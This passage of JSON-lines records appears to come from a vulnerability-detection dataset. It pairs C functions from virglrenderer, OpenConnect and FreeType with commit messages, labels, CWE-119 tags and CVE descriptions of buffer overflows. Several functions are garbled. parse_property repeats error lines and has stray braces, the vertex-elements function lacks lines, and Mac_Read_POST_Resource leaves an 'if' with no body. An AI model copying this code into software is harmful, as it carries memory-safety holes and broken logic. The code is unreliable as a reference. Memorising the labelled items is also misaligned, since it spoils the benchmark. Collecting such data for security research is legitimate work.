)\n{\n   struct tgsi_full_declaration decl;\n   uint file;\n   struct parsed_dcl_bracket brackets[2];\n   int num_brackets;\n   uint writemask;\n   const char *cur, *cur2;\n   uint advance;\n   boolean is_vs_input;\n\n   if (!eat_white( &ctx->cur )) {\n      report_error( ctx, \"Syntax error\" );\n      return FALSE;\n   }\n   if (!parse_register_dcl( ctx, &file, brackets, &num_brackets))\n      return FALSE;\n   if (!parse_opt_writemask( ctx, &writemask ))\n      return FALSE;\n\n   decl = tgsi_default_full_declaration();\n   decl.Declaration.File = file;\n   decl.Declaration.UsageMask = writemask;\n\n   if (num_brackets == 1) {\n      decl.Range.First = brackets[0].first;\n      decl.Range.Last = brackets[0].last;\n   } else {\n      decl.Range.First = brackets[1].first;\n      decl.Range.Last = brackets[1].last;\n\n      decl.Declaration.Dimension = 1;\n      decl.Dim.Index2D = brackets[0].first;\n   }\n\n   is_vs_input = (file == TGSI_FILE_INPUT &&\n                  ctx->processor == TGSI_PROCESSOR_VERTEX);\n\n   cur = ctx->cur;\n   eat_opt_white( &cur );\n   if (*cur == ',') {\n      cur2 = cur;\n      cur2++;\n      eat_opt_white( &cur2 );\n      if (str_match_nocase_whole( &cur2, \"ARRAY\" )) {\n         int arrayid;\n         if (*cur2 != '(') {\n            report_error( ctx, \"Expected `('\" );\n            return FALSE;\n         }\n         cur2++;\n         eat_opt_white( &cur2 );\n         if (!parse_int( &cur2, &arrayid )) {\n            report_error( ctx, \"Expected `,'\" );\n            return FALSE;\n         }\n         eat_opt_white( &cur2 );\n         if (*cur2 != ')') {\n            report_error( ctx, \"Expected `)'\" );\n            return FALSE;\n         }\n         cur2++;\n         decl.Declaration.Array = 1;\n         decl.Array.ArrayID = arrayid;\n         ctx->cur = cur = cur2;\n      }\n   }\n\n   if (*cur == ',' && !is_vs_input) {\n      uint i, j;\n\n      cur++;\n      eat_opt_white( &cur );\n      if (file == TGSI_FILE_RESOURCE) {\n         for (i = 0; i < TGSI_TEXTURE_COUNT; i++) {\n            if (str_match_nocase_whole(&cur, tgsi_texture_names[i])) {\n               decl.Resource.Resource = i;\n               break;\n            }\n         }\n         if (i == TGSI_TEXTURE_COUNT) {\n            report_error(ctx, \"Expected texture target\");\n            return FALSE;\n         }\n\n         cur2 = cur;\n         eat_opt_white(&cur2);\n         while (*cur2 == ',') {\n            cur2++;\n            eat_opt_white(&cur2);\n            if (str_match_nocase_whole(&cur2, \"RAW\")) {\n               decl.Resource.Raw = 1;\n\n            } else if (str_match_nocase_whole(&cur2, \"WR\")) {\n               decl.Resource.Writable = 1;\n\n            } else {\n               break;\n            }\n            cur = cur2;\n            eat_opt_white(&cur2);\n         }\n\n         ctx->cur = cur;\n\n      } else if (file == TGSI_FILE_SAMPLER_VIEW) {\n         for (i = 0; i < TGSI_TEXTURE_COUNT; i++) {\n            if (str_match_nocase_whole(&cur, tgsi_texture_names[i])) {\n               decl.SamplerView.Resource = i;\n               break;\n            }\n         }\n         if (i == TGSI_TEXTURE_COUNT) {\n            report_error(ctx, \"Expected texture target\");\n            return FALSE;\n         }\n         eat_opt_white( &cur );\n         if (*cur != ',') {\n            report_error( ctx, \"Expected `,'\" );\n            return FALSE;\n         }\n         ++cur;\n         eat_opt_white( &cur );\n         for (j = 0; j < 4; ++j) {\n            for (i = 0; i < TGSI_RETURN_TYPE_COUNT; ++i) {\n               if (str_match_nocase_whole(&cur, tgsi_return_type_names[i])) {\n                  switch (j) {\n                  case 0:\n                     decl.SamplerView.ReturnTypeX = i;\n                     break;\n                  case 1:\n                     decl.SamplerView.ReturnTypeY = i;\n                     break;\n                  case 2:\n                     decl.SamplerView.ReturnTypeZ = i;\n                     break;\n                  case 3:\n                     decl.SamplerView.ReturnTypeW = i;\n                     break;\n                  default:\n                     assert(0);\n                  }\n                  break;\n               }\n            }\n            if (i == TGSI_RETURN_TYPE_COUNT) {\n               if (j == 0 || j >  2) {\n                  report_error(ctx, \"Expected type name\");\n                  return FALSE;\n               }\n               break;\n            } else {\n               cur2 = cur;\n               eat_opt_white( &cur2 );\n               if (*cur2 == ',') {\n                  cur2++;\n                  eat_opt_white( &cur2 );\n                  cur = cur2;\n                  continue;\n               } else\n                  break;\n            }\n         }\n         if (j < 4) {\n            decl.SamplerView.ReturnTypeY =\n               decl.SamplerView.ReturnTypeZ =\n               decl.SamplerView.ReturnTypeW =\n               decl.SamplerView.ReturnTypeX;\n         }\n         ctx->cur = cur;\n      } else {\n         if (str_match_nocase_whole(&cur, \"LOCAL\")) {\n            decl.Declaration.Local = 1;\n            ctx->cur = cur;\n         }\n\n         cur = ctx->cur;\n         eat_opt_white( &cur );\n         if (*cur == ',') {\n            cur++;\n            eat_opt_white( &cur );\n\n            for (i = 0; i < TGSI_SEMANTIC_COUNT; i++) {\n               if (str_match_nocase_whole(&cur, tgsi_semantic_names[i])) {\n                  uint index;\n\n                  cur2 = cur;\n                  eat_opt_white( &cur2 );\n                  if (*cur2 == '[') {\n                     cur2++;\n                     eat_opt_white( &cur2 );\n                     if (!parse_uint( &cur2, &index )) {\n                        report_error( ctx, \"Expected literal integer\" );\n                        return FALSE;\n                     }\n                     eat_opt_white( &cur2 );\n                     if (*cur2 != ']') {\n                        report_error( ctx, \"Expected `]'\" );\n                        return FALSE;\n                     }\n                     cur2++;\n\n                     decl.Semantic.Index = index;\n\n                     cur = cur2;\n                  }\n\n                  decl.Declaration.Semantic = 1;\n                  decl.Semantic.Name = i;\n\n                  ctx->cur = cur;\n                  break;\n               }\n            }\n         }\n      }\n   }\n\n   cur = ctx->cur;\n   eat_opt_white( &cur );\n   if (*cur == ',' && !is_vs_input) {\n      uint i;\n\n      cur++;\n      eat_opt_white( &cur );\n      for (i = 0; i < TGSI_INTERPOLATE_COUNT; i++) {\n         if (str_match_nocase_whole( &cur, tgsi_interpolate_names[i] )) {\n            decl.Declaration.Interpolate = 1;\n            decl.Interp.Interpolate = i;\n\n            ctx->cur = cur;\n            break;\n         }\n      }\n      if (i == TGSI_INTERPOLATE_COUNT) {\n         report_error( ctx, \"Expected semantic or interpolate attribute\" );\n         return FALSE;\n      }\n   }\n\n   cur = ctx->cur;\n   eat_opt_white( &cur );\n   if (*cur == ',' && !is_vs_input) {\n      uint i;\n\n      cur++;\n      eat_opt_white( &cur );\n      for (i = 0; i < TGSI_INTERPOLATE_LOC_COUNT; i++) {\n         if (str_match_nocase_whole( &cur, tgsi_interpolate_locations[i] )) {\n            decl.Interp.Location = i;\n\n            ctx->cur = cur;\n            break;\n         }\n      }\n   }\n\n   advance = tgsi_build_full_declaration(\n      &decl,\n      ctx->tokens_cur,\n      ctx->header,\n      (uint) (ctx->tokens_end - ctx->tokens_cur) );\n\n   if (advance == 0)\n      return FALSE;\n   ctx->tokens_cur += advance;\n\n   return TRUE;\n}\n\nstatic boolean parse_immediate( struct translate_ctx *ctx )\n{\n   struct tgsi_full_immediate imm;\n   uint advance;\n   int type;\n\n   if (*ctx->cur == '[') {\n      uint uindex;\n\n      ++ctx->cur;\n\n      eat_opt_white( &ctx->cur );\n      if (!parse_uint( &ctx->cur, &uindex )) {\n         report_error( ctx, \"Expected literal unsigned integer\" );\n         return FALSE;\n      }\n\n      if (uindex != ctx->num_immediates) {\n         report_error( ctx, \"Immediates must be sorted\" );\n         return FALSE;\n      }\n\n      eat_opt_white( &ctx->cur );\n      if (*ctx->cur != ']') {\n         report_error( ctx, \"Expected `]'\" );\n         return FALSE;\n      }\n\n      ctx->cur++;\n   }\n\n   if (!eat_white( &ctx->cur )) {\n      report_error( ctx, \"Syntax error\" );\n      return FALSE;\n   }\n   for (type = 0; type < Elements(tgsi_immediate_type_names); ++type) {\n      if (str_match_nocase_whole(&ctx->cur, tgsi_immediate_type_names[type]))\n         break;\n   }\n   if (type == Elements(tgsi_immediate_type_names)) {\n      report_error( ctx, \"Expected immediate type\" );\n      return FALSE;\n   }\n\n   imm = tgsi_default_full_immediate();\n   imm.Immediate.NrTokens += 4;\n   imm.Immediate.DataType = type;\n   parse_immediate_data(ctx, type, imm.u);\n\n   advance = tgsi_build_full_immediate(\n      &imm,\n      ctx->tokens_cur,\n      ctx->header,\n      (uint) (ctx->tokens_end - ctx->tokens_cur) );\n   if (advance == 0)\n      return FALSE;\n   ctx->tokens_cur += advance;\n\n   ctx->num_immediates++;\n\n   return TRUE;\n}\n\nstatic boolean\nparse_primitive( const char **pcur, uint *primitive )\n{\n   uint i;\n\n   for (i = 0; i < PIPE_PRIM_MAX; i++) {\n      const char *cur = *pcur;\n\n      if (str_match_nocase_whole( &cur, tgsi_primitive_names[i])) {\n         *primitive = i;\n         *pcur = cur;\n         return TRUE;\n      }\n   }\n   return FALSE;\n}\n\nstatic boolean\nparse_fs_coord_origin( const char **pcur, uint *fs_coord_origin )\n{\n   uint i;\n\n   for (i = 0; i < Elements(tgsi_fs_coord_origin_names); i++) {\n      const char *cur = *pcur;\n\n      if (str_match_nocase_whole( &cur, tgsi_fs_coord_origin_names[i])) {\n         *fs_coord_origin = i;\n         *pcur = cur;\n         return TRUE;\n      }\n   }\n   return FALSE;\n}\n\nstatic boolean\nparse_fs_coord_pixel_center( const char **pcur, uint *fs_coord_pixel_center )\n{\n   uint i;\n\n   for (i = 0; i < Elements(tgsi_fs_coord_pixel_center_names); i++) {\n      const char *cur = *pcur;\n\n      if (str_match_nocase_whole( &cur, tgsi_fs_coord_pixel_center_names[i])) {\n         *fs_coord_pixel_center = i;\n         *pcur = cur;\n         return TRUE;\n      }\n   }\n   return FALSE;\n}\n\n\nstatic boolean parse_property( struct translate_ctx *ctx )\n{\n   struct tgsi_full_property prop;\n   uint property_name;\n   uint values[8];\n   uint advance;\n   char id[64];\n\n   if (!eat_white( &ctx->cur )) {\n      report_error( ctx, \"Syntax error\" );\n      return FALSE;\n   }\n       report_error( ctx, \"Syntax error\" );\n       return FALSE;\n    }\n   if (!parse_identifier( &ctx->cur, id, sizeof(id) )) {\n       report_error( ctx, \"Syntax error\" );\n       return FALSE;\n    }\n         break;\n      }\n   }\n", "func_hash": 72378232091169844659239787043415407980, "file_name": "None", "file_hash": null, "cwe": ["CWE-119"], "cve": "CVE-2017-6209", "cve_desc": "Stack-based buffer overflow in the parse_identifier function in tgsi_text.c in the TGSI auxiliary module in the Gallium driver in virglrenderer before 0.6.0 allows local guest OS users to cause a denial of service (out-of-bounds array access and QEMU process crash) via vectors related to parsing properties.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2017-6209"}
{"idx": 158102, "project": "virglrenderer", "commit_id": "114688c526fe45f341d75ccd1d85473c3b08f7a7", "project_url": "https://gitlab.freedesktop.org/virgl/virglrenderer", "commit_url": "https://cgit.freedesktop.org/virglrenderer/commit/?id=114688c526fe45f341d75ccd1d85473c3b08f7a7", "commit_message": "renderer: fix heap overflow in vertex elements state create\n\nThe 'num_elements' can be controlled by the guest but the\n'vrend_vertex_element_array' has a fixed 'elements' field.\nThis can cause a heap overflow. Add sanity check of 'num_elements'.\n\nSigned-off-by: Li Qiang <liq3ea@gmail.com>\nReviewed-by: Marc-Andr\u00e9 Lureau <marcandre.lureau@redhat.com>\nSigned-off-by: Dave Airlie <airlied@redhat.com>", "target": 0, "func": "int vrend_create_vertex_elements_state(struct vrend_context *ctx,\n                                       uint32_t handle,\n                                       unsigned num_elements,\n                                       const struct pipe_vertex_element *elements)\n{\n   struct vrend_vertex_element_array *v = CALLOC_STRUCT(vrend_vertex_element_array);\n   const struct util_format_description *desc;\n   GLenum type;\n   int i;\n   uint32_t ret_handle;\n\n    if (!v)\n       return ENOMEM;\n \n   if (num_elements > PIPE_MAX_ATTRIBS)\n      return EINVAL;\n\n    v->count = num_elements;\n    for (i = 0; i < num_elements; i++) {\n       memcpy(&v->elements[i].base, &elements[i], sizeof(struct pipe_vertex_element));\n         FREE(v);\n         return EINVAL;\n      }\n\n      type = GL_FALSE;\n      if (desc->channel[0].type == UTIL_FORMAT_TYPE_FLOAT) {\n         if (desc->channel[0].size == 32)\n            type = GL_FLOAT;\n         else if (desc->channel[0].size == 64)\n            type = GL_DOUBLE;\n         else if (desc->channel[0].size == 16)\n            type = GL_HALF_FLOAT;\n      } else if (desc->channel[0].type == UTIL_FORMAT_TYPE_UNSIGNED &&\n                 desc->channel[0].size == 8)\n         type = GL_UNSIGNED_BYTE;\n      else if (desc->channel[0].type == UTIL_FORMAT_TYPE_SIGNED &&\n               desc->channel[0].size == 8)\n         type = GL_BYTE;\n      else if (desc->channel[0].type == UTIL_FORMAT_TYPE_UNSIGNED &&\n               desc->channel[0].size == 16)\n         type = GL_UNSIGNED_SHORT;\n      else if (desc->channel[0].type == UTIL_FORMAT_TYPE_SIGNED &&\n               desc->channel[0].size == 16)\n         type = GL_SHORT;\n      else if (desc->channel[0].type == UTIL_FORMAT_TYPE_UNSIGNED &&\n               desc->channel[0].size == 32)\n         type = GL_UNSIGNED_INT;\n      else if (desc->channel[0].type == UTIL_FORMAT_TYPE_SIGNED &&\n               desc->channel[0].size == 32)\n         type = GL_INT;\n      else if (elements[i].src_format == PIPE_FORMAT_R10G10B10A2_SSCALED ||\n               elements[i].src_format == PIPE_FORMAT_R10G10B10A2_SNORM ||\n               elements[i].src_format == PIPE_FORMAT_B10G10R10A2_SNORM)\n         type = GL_INT_2_10_10_10_REV;\n      else if (elements[i].src_format == PIPE_FORMAT_R10G10B10A2_USCALED ||\n               elements[i].src_format == PIPE_FORMAT_R10G10B10A2_UNORM ||\n               elements[i].src_format == PIPE_FORMAT_B10G10R10A2_UNORM)\n         type = GL_UNSIGNED_INT_2_10_10_10_REV;\n      else if (elements[i].src_format == PIPE_FORMAT_R11G11B10_FLOAT)\n         type = GL_UNSIGNED_INT_10F_11F_11F_REV;\n\n      if (type == GL_FALSE) {\n         report_context_error(ctx, VIRGL_ERROR_CTX_ILLEGAL_VERTEX_FORMAT, elements[i].src_format);\n         FREE(v);\n         return EINVAL;\n      }\n\n      v->elements[i].type = type;\n      if (desc->channel[0].normalized)\n         v->elements[i].norm = GL_TRUE;\n      if (desc->nr_channels == 4 && desc->swizzle[0] == UTIL_FORMAT_SWIZZLE_Z)\n         v->elements[i].nr_chan = GL_BGRA;\n      else if (elements[i].src_format == PIPE_FORMAT_R11G11B10_FLOAT)\n         v->elements[i].nr_chan = 3;\n      else\n         v->elements[i].nr_chan = desc->nr_channels;\n   }\n", "func_hash": 226301324475184087438442572611658189614, "file_name": "None", "file_hash": null, "cwe": ["CWE-119"], "cve": "CVE-2017-5994", "cve_desc": "Heap-based buffer overflow in the vrend_create_vertex_elements_state function in vrend_renderer.c in virglrenderer before 0.6.0 allows local guest OS users to cause a denial of service (out-of-bounds array access and crash) via the num_elements parameter.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2017-5994"}
{"idx": 158105, "project": "infradead", "commit_id": "14cae65318d3ef1f7d449e463b72b6934e82f1c2", "project_url": "http://git.infradead.org/?p=mtd-2.6", "commit_url": "http://git.infradead.org/users/dwmw2/openconnect.git/commitdiff/14cae65318d3ef1f7d449e463b72b6934e82f1c2", "commit_message": "None", "target": 0, "func": "static void set_banner(struct openconnect_info *vpninfo)\n{\n        char *banner, *q;\n        const char *p;\n \n       if (!vpninfo->banner || !(banner = malloc(strlen(vpninfo->banner)+1))) {\n                unsetenv(\"CISCO_BANNER\");\n                return;\n        }\n\tp = vpninfo->banner;\n\tq = banner;\n\t\n\twhile (*p) {\n\t\tif (*p == '%' && isxdigit((int)(unsigned char)p[1]) &&\n\t\t    isxdigit((int)(unsigned char)p[2])) {\n\t\t\t*(q++) = unhex(p + 1);\n\t\t\tp += 3;\n\t\t} else \n\t\t\t*(q++) = *(p++);\n\t}\n\t*q = 0;\n\tsetenv(\"CISCO_BANNER\", banner, 1);\n\n\tfree(banner);\n}\t\n", "func_hash": 279834395077552091770358368547534380658, "file_name": "None", "file_hash": null, "cwe": ["CWE-119"], "cve": "CVE-2012-3291", "cve_desc": "Heap-based buffer overflow in OpenConnect 3.18 allows remote servers to cause a denial of service via a crafted greeting banner.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2012-3291"}
{"idx": 158113, "project": "virglrenderer", "commit_id": "28894a30a17a84529be102b21118e55d6c9f23fa", "project_url": "https://gitlab.freedesktop.org/virgl/virglrenderer", "commit_url": "https://cgit.freedesktop.org/virglrenderer/commit/src/gallium/auxiliary/tgsi/tgsi_text.c?id=28894a30a17a84529be102b21118e55d6c9f23fa", "commit_message": "gallium/tgsi: fix oob access in parse instruction\n\nWhen parsing texture instruction, it doesn't stop if the\n'cur' is ',', the loop variable 'i' will also be increased\nand be used to index the 'inst.TexOffsets' array. This can lead\nan oob access issue. This patch avoid this.\n\nSigned-off-by: Li Qiang <liq3ea@gmail.com>\nSigned-off-by: Dave Airlie <airlied@redhat.com>", "target": 0, "func": "parse_instruction(\n   struct translate_ctx *ctx,\n   boolean has_label )\n{\n   uint i;\n   uint saturate = 0;\n   const struct tgsi_opcode_info *info;\n   struct tgsi_full_instruction inst;\n   const char *cur;\n   uint advance;\n\n   inst = tgsi_default_full_instruction();\n\n   /* Parse predicate.\n    */\n   eat_opt_white( &ctx->cur );\n   if (*ctx->cur == '(') {\n      uint file;\n      int index;\n      uint swizzle[4];\n      boolean parsed_swizzle;\n\n      inst.Instruction.Predicate = 1;\n\n      ctx->cur++;\n      if (*ctx->cur == '!') {\n         ctx->cur++;\n         inst.Predicate.Negate = 1;\n      }\n\n      if (!parse_register_1d( ctx, &file, &index ))\n         return FALSE;\n\n      if (parse_optional_swizzle( ctx, swizzle, &parsed_swizzle, 4 )) {\n         if (parsed_swizzle) {\n            inst.Predicate.SwizzleX = swizzle[0];\n            inst.Predicate.SwizzleY = swizzle[1];\n            inst.Predicate.SwizzleZ = swizzle[2];\n            inst.Predicate.SwizzleW = swizzle[3];\n         }\n      }\n\n      if (*ctx->cur != ')') {\n         report_error( ctx, \"Expected `)'\" );\n         return FALSE;\n      }\n\n      ctx->cur++;\n   }\n\n   /* Parse instruction name.\n    */\n   eat_opt_white( &ctx->cur );\n   for (i = 0; i < TGSI_OPCODE_LAST; i++) {\n      cur = ctx->cur;\n\n      info = tgsi_get_opcode_info( i );\n      if (match_inst(&cur, &saturate, info)) {\n         if (info->num_dst + info->num_src + info->is_tex == 0) {\n            ctx->cur = cur;\n            break;\n         }\n         else if (*cur == '\\0' || eat_white( &cur )) {\n            ctx->cur = cur;\n            break;\n         }\n      }\n   }\n   if (i == TGSI_OPCODE_LAST) {\n      if (has_label)\n         report_error( ctx, \"Unknown opcode\" );\n      else\n         report_error( ctx, \"Expected `DCL', `IMM' or a label\" );\n      return FALSE;\n   }\n\n   inst.Instruction.Opcode = i;\n   inst.Instruction.Saturate = saturate;\n   inst.Instruction.NumDstRegs = info->num_dst;\n   inst.Instruction.NumSrcRegs = info->num_src;\n\n   if (i >= TGSI_OPCODE_SAMPLE && i <= TGSI_OPCODE_GATHER4) {\n      /*\n       * These are not considered tex opcodes here (no additional\n       * target argument) however we're required to set the Texture\n       * bit so we can set the number of tex offsets.\n       */\n      inst.Instruction.Texture = 1;\n      inst.Texture.Texture = TGSI_TEXTURE_UNKNOWN;\n   }\n\n   /* Parse instruction operands.\n    */\n   for (i = 0; i < info->num_dst + info->num_src + info->is_tex; i++) {\n      if (i > 0) {\n         eat_opt_white( &ctx->cur );\n         if (*ctx->cur != ',') {\n            report_error( ctx, \"Expected `,'\" );\n            return FALSE;\n         }\n         ctx->cur++;\n         eat_opt_white( &ctx->cur );\n      }\n\n      if (i < info->num_dst) {\n         if (!parse_dst_operand( ctx, &inst.Dst[i] ))\n            return FALSE;\n      }\n      else if (i < info->num_dst + info->num_src) {\n         if (!parse_src_operand( ctx, &inst.Src[i - info->num_dst] ))\n            return FALSE;\n      }\n      else {\n         uint j;\n\n         for (j = 0; j < TGSI_TEXTURE_COUNT; j++) {\n            if (str_match_nocase_whole( &ctx->cur, tgsi_texture_names[j] )) {\n               inst.Instruction.Texture = 1;\n               inst.Texture.Texture = j;\n               break;\n            }\n         }\n         if (j == TGSI_TEXTURE_COUNT) {\n            report_error( ctx, \"Expected texture target\" );\n            return FALSE;\n         }\n      }\n   }\n \n    cur = ctx->cur;\n    eat_opt_white( &cur );\n   for (i = 0; inst.Instruction.Texture && *cur == ',' && i < TGSI_FULL_MAX_TEX_OFFSETS; i++) {\n          cur++;\n          eat_opt_white( &cur );\n          ctx->cur = cur;\n         if (!parse_texoffset_operand( ctx, &inst.TexOffsets[i] ))\n            return FALSE;\n         cur = ctx->cur;\n         eat_opt_white( &cur );\n   }\n   inst.Texture.NumOffsets = i;\n\n   cur = ctx->cur;\n   eat_opt_white( &cur );\n   if (info->is_branch && *cur == ':') {\n      uint target;\n\n      cur++;\n      eat_opt_white( &cur );\n      if (!parse_uint( &cur, &target )) {\n         report_error( ctx, \"Expected a label\" );\n         return FALSE;\n      }\n      inst.Instruction.Label = 1;\n      inst.Label.Label = target;\n      ctx->cur = cur;\n   }\n\n   advance = tgsi_build_full_instruction(\n      &inst,\n      ctx->tokens_cur,\n      ctx->header,\n      (uint) (ctx->tokens_end - ctx->tokens_cur) );\n   if (advance == 0)\n      return FALSE;\n   ctx->tokens_cur += advance;\n\n   return TRUE;\n}\n", "func_hash": 321254582650752893308442793791247099756, "file_name": "tgsi_text.c", "file_hash": 244335851684317795143634576379783630430, "cwe": ["CWE-119"], "cve": "CVE-2017-5580", "cve_desc": "The parse_instruction function in gallium/auxiliary/tgsi/tgsi_text.c in virglrenderer before 0.6.0 allows local guest OS users to cause a denial of service (out-of-bounds array access and process crash) via a crafted texture instruction.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2017-5580"}
{"idx": 158122, "project": "savannah", "commit_id": "888cd1843e935fe675cf2ac303116d4ed5b9d54b", "project_url": "https://git.savannah.gnu.org/gitweb/?p=gnutls", "commit_url": "https://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=888cd1843e935fe675cf2ac303116d4ed5b9d54b", "commit_message": "None", "target": 0, "func": "  Ins_IUP( INS_ARG )\n  {\n    IUP_WorkerRec  V;\n    FT_Byte        mask;\n\n    FT_UInt   first_point;   /* first point of contour        */\n    FT_UInt   end_point;     /* end point (last+1) of contour */\n\n    FT_UInt   first_touched; /* first touched point in contour   */\n    FT_UInt   cur_touched;   /* current touched point in contour */\n\n    FT_UInt   point;         /* current point   */\n    FT_Short  contour;       /* current contour */\n\n    FT_UNUSED_ARG;\n\n\n    /* ignore empty outlines */\n    if ( CUR.pts.n_contours == 0 )\n      return;\n\n    if ( CUR.opcode & 1 )\n    {\n      mask   = FT_CURVE_TAG_TOUCH_X;\n      V.orgs = CUR.pts.org;\n      V.curs = CUR.pts.cur;\n      V.orus = CUR.pts.orus;\n    }\n    else\n    {\n      mask   = FT_CURVE_TAG_TOUCH_Y;\n      V.orgs = (FT_Vector*)( (FT_Pos*)CUR.pts.org + 1 );\n      V.curs = (FT_Vector*)( (FT_Pos*)CUR.pts.cur + 1 );\n      V.orus = (FT_Vector*)( (FT_Pos*)CUR.pts.orus + 1 );\n    }\n    V.max_points = CUR.pts.n_points;\n\n    contour = 0;\n    point   = 0;\n\n    do\n    {\n       end_point   = CUR.pts.contours[contour] - CUR.pts.first_point;\n       first_point = point;\n \n      if ( BOUNDS ( end_point, CUR.pts.n_points ) )\n        end_point = CUR.pts.n_points - 1;\n \n       while ( point <= end_point && ( CUR.pts.tags[point] & mask ) == 0 )\n         point++;\n\n      if ( point <= end_point )\n      {\n        first_touched = point;\n        cur_touched   = point;\n\n        point++;\n\n        while ( point <= end_point )\n        {\n          if ( ( CUR.pts.tags[point] & mask ) != 0 )\n          {\n            if ( point > 0 )\n              _iup_worker_interpolate( &V,\n                                       cur_touched + 1,\n                                       point - 1,\n                                       cur_touched,\n                                       point );\n            cur_touched = point;\n          }\n\n          point++;\n        }\n\n        if ( cur_touched == first_touched )\n          _iup_worker_shift( &V, first_point, end_point, cur_touched );\n        else\n        {\n          _iup_worker_interpolate( &V,\n                                   (FT_UShort)( cur_touched + 1 ),\n                                   end_point,\n                                   cur_touched,\n                                   first_touched );\n\n          if ( first_touched > 0 )\n            _iup_worker_interpolate( &V,\n                                     first_point,\n                                     first_touched - 1,\n                                     cur_touched,\n                                     first_touched );\n        }\n      }\n      contour++;\n    } while ( contour < CUR.pts.n_contours );\n  }\n", "func_hash": 12490107828131494076459414255246754337, "file_name": "None", "file_hash": null, "cwe": ["CWE-119"], "cve": "CVE-2010-2520", "cve_desc": "Heap-based buffer overflow in the Ins_IUP function in truetype/ttinterp.c in FreeType before 2.4.0, when TrueType bytecode support is enabled, allows remote attackers to cause a denial of service (application crash) or possibly execute arbitrary code via a crafted font file.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2010-2520"}
{"idx": 158123, "project": "savannah", "commit_id": "b2ea64bcc6c385a8e8318f9c759450a07df58b6d", "project_url": "https://git.savannah.gnu.org/gitweb/?p=gnutls", "commit_url": "https://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=b2ea64bcc6c385a8e8318f9c759450a07df58b6d", "commit_message": "None", "target": 0, "func": "  Mac_Read_POST_Resource( FT_Library  library,\n                          FT_Stream   stream,\n                          FT_Long    *offsets,\n                          FT_Long     resource_cnt,\n                          FT_Long     face_index,\n                          FT_Face    *aface )\n  {\n    FT_Error   error  = FT_Err_Cannot_Open_Resource;\n    FT_Memory  memory = library->memory;\n    FT_Byte*   pfb_data;\n    int        i, type, flags;\n    FT_Long    len;\n    FT_Long    pfb_len, pfb_pos, pfb_lenpos;\n    FT_Long    rlen, temp;\n\n\n    if ( face_index == -1 )\n      face_index = 0;\n    if ( face_index != 0 )\n      return error;\n\n    /* Find the length of all the POST resources, concatenated.  Assume */\n    /* worst case (each resource in its own section).                   */\n    pfb_len = 0;\n    for ( i = 0; i < resource_cnt; ++i )\n    {\n      error = FT_Stream_Seek( stream, offsets[i] );\n      if ( error )\n        goto Exit;\n      if ( FT_READ_LONG( temp ) )\n        goto Exit;\n      pfb_len += temp + 6;\n    }\n\n    if ( FT_ALLOC( pfb_data, (FT_Long)pfb_len + 2 ) )\n      goto Exit;\n\n    pfb_data[0] = 0x80;\n    pfb_data[1] = 1;            /* Ascii section */\n    pfb_data[2] = 0;            /* 4-byte length, fill in later */\n    pfb_data[3] = 0;\n    pfb_data[4] = 0;\n    pfb_data[5] = 0;\n    pfb_pos     = 6;\n    pfb_lenpos  = 2;\n\n    len = 0;\n    type = 1;\n    for ( i = 0; i < resource_cnt; ++i )\n    {\n      error = FT_Stream_Seek( stream, offsets[i] );\n      if ( error )\n        goto Exit2;\n      if ( FT_READ_LONG( rlen ) )\n        goto Exit;\n      if ( FT_READ_USHORT( flags ) )\n        goto Exit;\n       FT_TRACE3(( \"POST fragment[%d]: offsets=0x%08x, rlen=0x%08x, flags=0x%04x\\n\",\n                    i, offsets[i], rlen, flags ));\n \n      if ( ( flags >> 8 ) == 0 )        /* Comment, should not be loaded */\n        continue;\n\n       /* the flags are part of the resource, so rlen >= 2.  */\n       /* but some fonts declare rlen = 0 for empty fragment */\n       if ( rlen > 2 )\n\n      if ( ( flags >> 8 ) == type )\n        len += rlen;\n      else\n      {\n        if ( pfb_lenpos + 3 > pfb_len + 2 )\n          goto Exit2;\n        pfb_data[pfb_lenpos    ] = (FT_Byte)( len );\n        pfb_data[pfb_lenpos + 1] = (FT_Byte)( len >> 8 );\n        pfb_data[pfb_lenpos + 2] = (FT_Byte)( len >> 16 );\n        pfb_data[pfb_lenpos + 3] = (FT_Byte)( len >> 24 );\n\n        if ( ( flags >> 8 ) == 5 )      /* End of font mark */\n          break;\n\n        if ( pfb_pos + 6 > pfb_len + 2 )\n          goto Exit2;\n        pfb_data[pfb_pos++] = 0x80;\n\n        type = flags >> 8;\n        len = rlen;\n\n        pfb_data[pfb_pos++] = (FT_Byte)type;\n        pfb_lenpos          = pfb_pos;\n        pfb_data[pfb_pos++] = 0;        /* 4-byte length, fill in later */\n        pfb_data[pfb_pos++] = 0;\n        pfb_data[pfb_pos++] = 0;\n        pfb_data[pfb_pos++] = 0;\n      }\n\n      error = FT_Stream_Read( stream, (FT_Byte *)pfb_data + pfb_pos, rlen );\n      if ( error )\n        goto Exit2;\n      pfb_pos += rlen;\n    }\n\n    if ( pfb_pos + 2 > pfb_len + 2 )\n      goto Exit2;\n    pfb_data[pfb_pos++] = 0x80;\n    pfb_data[pfb_pos++] = 3;\n\n    if ( pfb_lenpos + 3 > pfb_len + 2 )\n      goto Exit2;\n    pfb_data[pfb_lenpos    ] = (FT_Byte)( len );\n    pfb_data[pfb_lenpos + 1] = (FT_Byte)( len >> 8 );\n    pfb_data[pfb_lenpos + 2] = (FT_Byte)( len >> 16 );\n    pfb_data[pfb_lenpos + 3] = (FT_Byte)( len >> 24 );\n\n    return open_face_from_buffer( library,\n                                  pfb_data,\n                                  pfb_pos,\n                                  face_index,\n                                  \"type1\",\n                                  aface );\n\n  Exit2:\n    FT_FREE( pfb_data );\n\n  Exit:\n    return error;\n  }\n", "func_hash": 138045724524241880239158930414068620502, "file_name": "None", "file_hash": null, "cwe": ["CWE-119"], "cve": "CVE-2010-2519", "cve_desc": "Heap-based buffer overflow in the Mac_Read_POST_Resource function in base/ftobjs.c in FreeType before 2.4.0 allows remote attackers to cause a denial of service (application crash) or possibly execute arbitrary code via a crafted length value in a POST fragment header in a font file.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2010-2519"}
